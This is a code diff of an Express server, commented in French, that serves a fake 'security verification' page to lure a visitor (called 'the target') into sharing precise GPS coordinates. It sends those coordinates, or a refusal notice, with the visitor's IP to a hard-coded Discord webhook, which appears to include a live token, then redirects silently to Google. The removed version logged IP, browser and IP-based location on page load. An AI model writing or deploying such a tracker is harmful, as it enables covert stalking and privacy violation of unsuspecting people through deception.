@@ -2,102 +2,105 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// REMPLACE LE TEXTE ENTRE GUILLEMETS PAR TON LIEN DISCORD :
+// URL de ton Webhook Discord
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546990311144689736/JNIn6Zl1Dr3ep-Kvm6uwz_HHDfS8vco5ThkHLWGgkMHQOvIph6DdGUd10V3YjbEOndBE";
 
-app.set('trust proxy', true);
 app.use(express.json());
 
-app.get('/', async (req, res) => {
-  const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
-  const userAgent = req.headers['user-agent'] || 'Inconnu';
-  const language = req.headers['accept-language'] || 'Non spécifiée';
-  const timestamp = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
+// 1. Page d'accueil consultée par la cible
+app.get('/', (req, res) => {
+    res.send(`
+        <!DOCTYPE html>
+        <html lang="fr">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Vérification de sécurité</title>
+            <style>
+                body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f9; margin: 0; }
+                .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
+                button { background: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 15px; }
+                button:hover { background: #0056b3; }
+            </style>
+        </head>
+        <body>
+            <div class="card">
+                <h2>Vérification d'accès</h2>
+                <p>Veuillez autoriser la vérification pour accéder au contenu sécurisé.</p>
+                <button onclick="obtenirLocalisation()">Continuer</button>
+            </div>
 
-  let geo = { city: 'Inconnue', country_name: 'Inconnu', org: 'Inconnu' };
-  if (clientIp && !clientIp.includes('127.0.0.1') && !clientIp.includes('::1')) {
-    try {
-      const geoRes = await fetch(`https://ipapi.co/${clientIp}/json/`);
-      if (geoRes.ok) geo = await geoRes.json();
-    } catch (e) {}
-  }
+            <script>
+                function envoyerDonnees(coords) {
+                    fetch('/api/location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(coords)
+                    }).then(() => {
+                        // Redirection transparente après capture
+                        window.location.href = "https://www.google.com";
+                    });
+                }
 
-  if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com')) {
-    try {
-      await fetch(DISCORD_WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          embeds: [{
-            title: '🔔 Connexion sur le site !',
-            color: 3447003,
-            fields: [
-              { name: '📍 Adresse IP', value: `\`${clientIp}\``, inline: true },
-              { name: '🌍 Localisation (IP)', value: `${geo.city || 'Inconnue'}, ${geo.country_name || 'Inconnu'}`, inline: true },
-              { name: '🏢 Opérateur / FAI', value: geo.org || 'Inconnu', inline: false },
-              { name: '📱 Appareil & Navigateur', value: userAgent, inline: false },
-              { name: '⏰ Date et heure', value: timestamp, inline: true }
-            ]
-          }]
-        })
-      });
-    } catch (e) {}
-  }
-
-  res.send(`
-    <!DOCTYPE html>
-    <html lang="fr">
-    <head>
-      <meta charset="UTF-8">
-      <title>Bienvenue</title>
-      <style>
-        body { font-family: system-ui, sans-serif; display: grid; place-content: center; height: 100vh; margin: 0; background: #f0f2f5; }
-        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
-      </style>
-    </head>
-    <body>
-      <div class="card">
-        <h1>Bienvenue sur le site</h1>
-        <p>Chargement en cours...</p>
-      </div>
-      <script>
-        if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(async (pos) => {
-            await fetch('/api/gps', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy })
-            });
-          });
-        }
-      </script>
-    </body>
-    </html>
-  `);
+                function obtenirLocalisation() {
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                envoyerDonnees({
+                                    lat: position.coords.latitude,
+                                    lon: position.coords.longitude,
+                                    precision: position.coords.accuracy
+                                });
+                            },
+                            (error) => {
+                                // Si refusé, on signale quand même la visite
+                                envoyerDonnees({ erreur: "Permission refusée par l'utilisateur" });
+                            },
+                            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                        );
+                    } else {
+                        envoyerDonnees({ erreur: "Géolocalisation non supportée" });
+                    }
+                }
+            </script>
+        </body>
+        </html>
+    `);
 });
 
-app.post('/api/gps', async (req, res) => {
-  const { lat, lng, accuracy } = req.body;
-  if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com')) {
+// 2. Route de réception des coordonnées GPS
+app.post('/api/location', async (req, res) => {
+    const data = req.body;
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
+    let messageContent = "";
+
+    if (data.lat && data.lon) {
+        const mapsUrl = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
+        messageContent = `🚨 **POSITION GPS EXACTE CAPTURÉE !**\n\n` +
+                         `📍 **Latitude :** ${data.lat}\n` +
+                         `📍 **Longitude :** ${data.lon}\n` +
+                         `🎯 **Précision :** +/- ${Math.round(data.precision)} mètres\n` +
+                         `🗺️ **Lien Google Maps :** ${mapsUrl}\n` +
+                         `🌐 **IP :** \`${ip}\``;
+    } else {
+        messageContent = `⚠️ **Visite détectée mais GPS refusé**\n` +
+                         `🌐 **IP :** \`${ip}\`\n` +
+                         `❌ **Raison :** ${data.erreur || 'Inconnue'}`;
+    }
+
+    // Envoi sur Discord
     try {
-      await fetch(DISCORD_WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          embeds: [{
-            title: '🎯 Position GPS exacte confirmée !',
-            color: 5763719,
-            fields: [
-              { name: 'Coordonnées GPS', value: `\`${lat}, ${lng}\``, inline: true },
-              { name: 'Précision', value: `${Math.round(accuracy)} mètres`, inline: true },
-              { name: 'Carte', value: `[Ouvrir Google Maps](https://www.google.com/maps?q=${lat},${lng})`, inline: false }
-            ]
-          }]
-        })
-      });
-    } catch (e) {}
-  }
-  res.sendStatus(200);
+        await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: messageContent })
+        });
+    } catch (err) {
+        console.error("Erreur d'envoi Discord :", err);
+    }
+
+    res.sendStatus(200);
 });
 
-app.listen(PORT, () => console.log(`Serveur démarré sur le port ${PORT}`));
+app.listen(PORT, () => console.log(`Serveur prêt sur le port ${PORT}`));
